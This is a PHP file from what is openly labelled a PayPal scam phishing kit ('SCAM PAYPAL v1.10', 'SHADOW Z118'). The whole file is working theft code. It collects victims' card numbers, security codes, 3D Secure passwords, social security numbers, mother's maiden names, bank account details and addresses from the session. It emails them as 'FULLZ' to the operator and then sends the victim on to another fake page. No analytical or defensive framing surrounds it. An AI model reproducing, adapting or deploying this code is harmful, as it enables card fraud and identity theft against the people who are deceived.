<?php
/*   
   _____   _                   _                        ______    __    __     ___  
  / ____| | |                 | |                      |___  /   /_ |  /_ |   / _ \ 
 | (___   | |__     __ _    __| |   ___   __      __      / /    | |   | |   | (_) |
  \___ \  | '_ \   / _` |  / _` |  / _ \  \ \ /\ / /     / /   - | | - | | -  > _ < 
  ____) | | | | | | (_| | | (_| | | (_) |  \ V  V /     / /__  - | | - | | - | (_) |
 |_____/  |_| |_|  \__,_|  \__,_|  \___/    \_/\_/     /_____|   |_|   |_|    \___/ 
                                                                                
                              #=======================#
                              #   SCAM PAYPAL v1.10   #
                              #      SHADOW Z118      #
                              #=======================#
							  
                $$$$$$$\                     $$$$$$$\           $$\   
                $$  __$$\                    $$  __$$\          $$ |  
                $$ |  $$ |$$$$$$\  $$\   $$\ $$ |  $$ |$$$$$$\  $$ |  
                $$$$$$$  |\____$$\ $$ |  $$ |$$$$$$$  |\____$$\ $$ |  
                $$  ____/ $$$$$$$ |$$ |  $$ |$$  ____/ $$$$$$$ |$$ |  
                $$ |     $$  __$$ |$$ |  $$ |$$ |     $$  __$$ |$$ |  
                $$ |     \$$$$$$$ |\$$$$$$$ |$$ |     \$$$$$$$ |$$ |  
                \__|      \_______| \____$$ |\__|      \_______|\__|  
                                   $$\   $$ |                         
                                   \$$$$$$  |                         
                                    \______/                          
*/

session_start();
$TIME_DATE = date('H:i:s d/m/Y');
include('../../functions/Email.php');
include('../../functions/get_browser.php');
$Z118_MESSAGE .= "
<html>
<head><meta charset='UTF-8'></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
################ <font style='color: #820000;'>ACCOUNT PAYPAL FULLZ</font> ####################<br/>
±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>CARDING INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [Bank Name] = <font style='color:#0070ba;'>".$_SESSION['_cc_bank_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Cardholder's Name] = <font style='color:#0070ba;'>".$_SESSION['_nameoncard_']."</font><br>
<font style='color:#9c0000;'>✪</font> [".$_SESSION['_cd_']." Card Number] = <font style='color:#0070ba;'>".$_SESSION['_cardnumber_']." (".$_SESSION['_cc_class_'].")</font><br>
<font style='color:#9c0000;'>✪</font> [Card Security Code]	= <font style='color:#0070ba;'>".$_SESSION['_csc_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Expiration Date] = <font style='color:#0070ba;'>".$_SESSION['_expdate_']."</font><br>
±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>VBV INFO INFORMATION</font> ]±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [Date Of Birth]  = <font style='color:#0070ba;'>".$_SESSION['_dob_']."</font><br>
<font style='color:#9c0000;'>✪</font> [3D Secure]      = <font style='color:#0070ba;'>".$_SESSION['_password_vbv_']."</font><br>\n";
if ($_SESSION['_country_'] == "UNITED STATES"){ // UNITED STATES
$Z118_MESSAGE .= "<font style='color:#9c0000;'>✪</font> [Social Security Number] = <font style='color:#0070ba;'>".$_SESSION['_ssnnum_']."</font><br>\n";
$Z118_MESSAGE .= "<font style='color:#9c0000;'>✪</font> [Phone Number] = <font style='color:#0070ba;'>+".$_SESSION['_phone_']."-".$_SESSION['_phone_numb_']."</font><br>\n";}
elseif ($_SESSION['_country_'] == "CANADA"){ // CANADA
$Z118_MESSAGE .= "<font style='color:#9c0000;'>✪</font> [Social Security Number] = <font style='color:#0070ba;'>".$_SESSION['_ssnnum_']."</font><br>\n";
$Z118_MESSAGE .= "<font style='color:#9c0000;'>✪</font> [Mother's Maiden Name] = <font style='color:#0070ba;'>".$_SESSION['_mmname_']."</font><br>\n";
$Z118_MESSAGE .= "<font style='color:#9c0000;'>✪</font> [Phone Number] = <font style='color:#0070ba;'>+".$_SESSION['_phone_']."-".$_SESSION['_phone_numb_']."</font><br>\n";}
elseif ($_SESSION['_country_'] == "UNITED KINGDOM" || $_SESSION['_country_'] ==  "IRELAND"){ // UNITED KINGDOM // IRELAND
$Z118_MESSAGE .= "<font style='color:#9c0000;'>✪</font> [Sort Code] = <font style='color:#0070ba;'>".$_SESSION['_sortnum_']."</font><br>\n";
$Z118_MESSAGE .= "<font style='color:#9c0000;'>✪</font> [Account Number] = <font style='color:#0070ba;'>".$_SESSION['_accnumber_']."</font><br>\n";}
elseif($_SESSION['_country_'] == "AUSTRALIA"){ // AUSTRALIA
$Z118_MESSAGE .= "<font style='color:#9c0000;'>✪</font> [Credit Limits] = <font style='color:#0070ba;'>".$_SESSION['_creditlimit_']."</font><br>\n";
$Z118_MESSAGE .= "<font style='color:#9c0000;'>✪</font> [OSID]	= <font style='color:#0070ba;'>".$_SESSION['_osid_']."</font><br>\n";}
elseif($_SESSION['_country_'] == "ITALY"){ // ITALY
$Z118_MESSAGE .= "<font style='color:#9c0000;'>✪</font> [Codice Fiscale] = <font style='color:#0070ba;'>".$_SESSION['_codicefiscale_']."</font><br>\n";}
if($_SESSION['_country_'] == "SWITZERLAND" || $_SESSION['_country_'] ==  "GERMANY") { // SWITZERLAND || GERMANY
$Z118_MESSAGE .= "<font style='color:#9c0000;'>✪</font> [Kontonummer] = <font style='color:#0070ba;'>".$_SESSION['_kontonummer_']."</font><br>\n";}
elseif($_SESSION['_country_'] == "GREECE"){ // GREECE
$Z118_MESSAGE .= "<font style='color:#9c0000;'>✪</font> [Officiel ID] = <font style='color:#0070ba;'>".$_SESSION['_offid_']."</font><br>\n";}
$Z118_MESSAGE .= "
±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>BILLING INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [Address line] = <font style='color:#0070ba;'>".$_SESSION['_address_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Country Name] = <font style='color:#0070ba;'>".ucwords(strtolower($_SESSION['_country_']))."</font><br>
<font style='color:#9c0000;'>✪</font> [Town/City] = <font style='color:#0070ba;'>".$_SESSION['_city_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Province/State] = <font style='color:#0070ba;'>".$_SESSION['_state_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Postal/Zip Code] = <font style='color:#0070ba;'>".$_SESSION['_zipCode_']."</font><br>
±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>VICTIME INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [IP INFO] = <font style='color:#0070ba;'>https://geoiptool.com/en/?ip=".$_SESSION['_ip_']."</font><br>
<font style='color:#9c0000;'>✪</font> [TIME/DATE] = <font style='color:#0070ba;'>".$TIME_DATE."</font><br>
<font style='color:#9c0000;'>✪</font> [BROWSER] = <font style='color:#0070ba;'>".Z118_Browser($_SERVER['HTTP_USER_AGENT'])." On ".Z118_OS($_SERVER['HTTP_USER_AGENT'])."</font><br>
################## <font style='color: #820000;'>BY SHADOW Z.1.1.8</font> #####################
</div></html>\n";

    $Z118_SUBJECT = "".$_SESSION['_cardholder_']." ✪ VBV FULLZ : ".$_SESSION['_ccglobal_']." ✪ ".$_SESSION['_global_']." ✪ ".$_SESSION['_login_email_']." ✪";
    $Z118_HEADERS .= "From:SHADOW Z.1.1.8 <noreply@vssv.com>";
    $Z118_HEADERS .= $_POST['eMailAdd']."\n";
    $Z118_HEADERS .= "MIME-Version: 1.0\n";
	$Z118_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
	
        @mail($Z118_EMAIL, $Z118_SUBJECT, $Z118_MESSAGE, $Z118_HEADERS);
        HEADER("Location: ../identity/?cmd=_session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."", true, 303);
?>